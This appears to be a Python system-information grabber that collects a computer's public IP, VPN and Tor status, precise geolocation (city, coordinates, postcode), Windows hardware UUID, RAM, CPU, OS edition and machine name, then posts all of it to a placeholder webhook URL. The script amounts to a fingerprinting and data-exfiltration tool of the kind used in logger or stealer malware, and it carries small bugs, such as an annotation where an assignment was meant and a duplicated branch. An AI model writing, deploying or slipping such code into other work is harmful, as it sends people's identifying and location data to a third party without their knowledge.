from psutil import virtual_memory, cpu_count
from subprocess import check_output
from requests import get, post
import platform as p

app_version = 0.1

#! Get data
api = get('https://api.ipapi.is').json()
ram = virtual_memory()


#! Set network (IP-based) data
ip = api['ip']
abuser_score = api['company']['abuser_score'].split('(')[1].split(')')[0]
company = api['asn']['org']
is_tor = api['is_tor']
is_proxy = api['is_proxy']
registrar = api['rir']
is_vpn = False
vpn_provider = []

if abuser_score == "High":
    networkSuspicious = True
elif abuser_score == "Elevated":
    networkSuspicious = True
elif abuser_score == "Low":
    networkSuspicious = False
elif abuser_score == "Very Low":
    networkSuspicious = False
else:
    networkSuspicious: False

if "M247" in company: vpn_provider = ["Proton", "Kaspersky"]
elif "Datacamp" in company: vpn_provider = ["Proton"]
elif "NForce" in company: vpn_provider = ["Proton"]
elif "WorldStream" in company: vpn_provider = ["Proton"]
elif "EstNOC" in company: vpn_provider = ["Proton"]
elif "Farice" in company: vpn_provider = ["Proton"]
elif "Host Universal" in company: vpn_provider = ["Proton"]
elif "Anchorfree" in company: vpn_provider = ["Kaspersky", "Hotspot Shield"]
elif "Latitude.sh" in company: vpn_provider = ["Kaspersky"]
elif "Latitude.sh" in company: vpn_provider = ["Kaspersky"]
elif "TR1 Net" in company: vpn_provider = ["Kaspersky"]
elif "Leaseweb" in company: vpn_provider = ["Kaspersky"]
elif "20 Point" in company: vpn_provider = ["Kaspersky"]
elif "24SHELLS" in company: vpn_provider = ["Kaspersky"]
elif "Private Customer" in company: vpn_provider = ["Kaspersky"]

if vpn_provider == []:
    pass
else:
    is_vpn = True
    networkSuspicious = True

#! Set network (Geolocation) data
country = api['location']['country']
city = api['location']['city']
latitude = api['location']['latitude']
longitude = api['location']['longitude']
zip_code = api['location']['zip']
timezone = api['location']['timezone']

#! Set hardware data
try:
    uuid = check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
except:
    uuid = "None"
ram_GiB = ram.total / (1024**3)
ram_GB = ram.total / (1000**3)
cpu_threads = cpu_count()
cpu_technical = p.processor()

#! Set software (operating system) data
arch = p.architecture()[0]
release = p.release()
version = p.version()
edition = p.win32_edition()
operating_system = p.system()

#! Personal data
pc_name = p.node()

#! Export session

data = {
    "network":{
        "ip":ip,
        "is_tor":is_tor,
        "is_vpn":is_vpn,
        "company":company,
        "suspicious":networkSuspicious,
        "vpn_provider":vpn_provider
    },
    "geolocation":{
        "country":country,
        "city":city,
        "latitude":latitude,
        "longitude":longitude,
        "zip_code":zip_code,
        "timezone":timezone
    },
    "hardware":{
        "uuid":uuid,
        "cpu_technical":cpu_technical,
        "threads":cpu_threads,
        "ram_GiB":ram_GiB,
        "ram_GB":ram_GB
    },
    "software":{
        "operating_system":operating_system,
        "release":release,
        "version":version,
        "edition":edition,
        "arch":arch,
        "app_version":app_version
    },
    "personal":{
        "pc_name":pc_name
    }
}

webhook_url = "YOUR_WEBHOOK_URL"
response = post(webhook_url, json=data)